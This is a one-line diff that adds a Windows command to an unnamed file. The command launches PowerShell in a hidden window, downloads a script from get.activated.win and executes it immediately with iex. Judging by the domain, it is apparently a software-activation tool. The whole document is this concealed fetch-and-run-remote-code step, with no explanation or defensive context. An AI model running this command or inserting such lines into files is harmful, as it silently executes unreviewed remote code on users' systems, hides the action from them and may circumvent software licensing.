@@ -1,0 +1,1 @@
+start powershell -Command "Start-Process -WindowStyle Hidden powershell -ArgumentList '-Command iex (irm https://get.activated.win)' ; exit"
